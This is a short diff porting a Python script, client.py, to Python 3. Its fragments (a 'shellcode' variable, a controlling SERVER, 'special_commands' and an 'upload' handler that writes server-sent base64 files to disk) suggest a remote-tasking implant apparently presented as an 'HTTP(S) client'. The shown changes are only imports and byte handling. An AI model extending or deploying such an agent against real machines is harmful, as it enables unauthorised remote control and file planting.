@@ -15,14 +15,10 @@ from base64 import (
     b64encode as benc,
     urlsafe_b64decode as bdec
 )
-try:
-    from urllib import unquote
-    from urlparse import urlparse
-except ImportError:
-    from urllib.parse import (
-        unquote,
-        urlparse
-    )
+from urllib.parse import (
+    unquote,
+    urlparse
+)
 from argparse import (
     SUPPRESS,
     ArgumentParser,
@@ -54,7 +50,7 @@ except NameError:
 
 CERT = None
 SERVER = None
-shellcode = ""
+shellcode =  b""
 
 def console():
     parser = ArgumentParser(description="{}client.py:{} An HTTP(S) client with advanced features.".format('\033[1m', '\033[0m'),
@@ -217,8 +213,8 @@ try:
             if any(command in res.url for command in special_commands):
                 if 'upload' in res.url:
                     filename = res.url.split('/')[-1]
-                    with open(filename, 'w') as w:
-                        w.write(str(bdec(str(res.text))))
+                    with open(filename, 'wb') as w:
+                        w.write(bdec(res.text))
                     s.post(SERVER,
                         headers={
                                 "Filename" : filename,
